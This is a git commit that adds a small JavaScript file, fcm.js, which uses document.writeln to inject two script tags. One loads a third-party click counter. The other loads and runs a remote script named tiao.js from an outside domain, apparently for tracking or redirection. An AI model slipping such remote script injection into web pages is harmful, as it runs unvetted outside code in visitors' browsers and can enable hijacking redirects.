06561cbc459b26797f016b3c760616869b243294
js999999999 <js-9@outlook.com>
2015-09-01 16:44:32 +0800

    Create fcm.js

---
+++ ww8w/fcm.js
@@ -0,0 +1,3 @@
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count14.51yes.com\/click.aspx?id=148235448&logo=12\" charset=\"gb2312\"><\/script>");
+
+document.writeln("<script src=http:\/\/\www.647123.com\/ww8w/tiao.js ><\/script>");
